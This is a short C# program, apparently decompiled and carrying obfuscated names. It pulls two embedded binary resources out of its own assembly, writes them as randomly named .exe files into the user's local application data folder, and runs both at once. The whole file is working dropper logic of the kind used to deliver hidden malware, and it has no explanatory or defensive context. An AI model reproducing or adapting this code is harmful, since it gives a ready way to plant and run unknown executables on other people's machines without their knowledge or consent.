using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;

namespace ns0;

internal static class Class0
{
	private static void Main()
	{
		try
		{
			ResourceManager resourceManager = new ResourceManager("files", Assembly.GetExecutingAssembly());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "PVSrlKWroN.exe", (byte[])resourceManager.GetObject("jCJr_prJls"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "PVSrlKWroN.exe");
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "wLjelBqOtp.exe", (byte[])resourceManager.GetObject("LsgRVnLgBX"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "wLjelBqOtp.exe");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.Read();
		}
	}
}
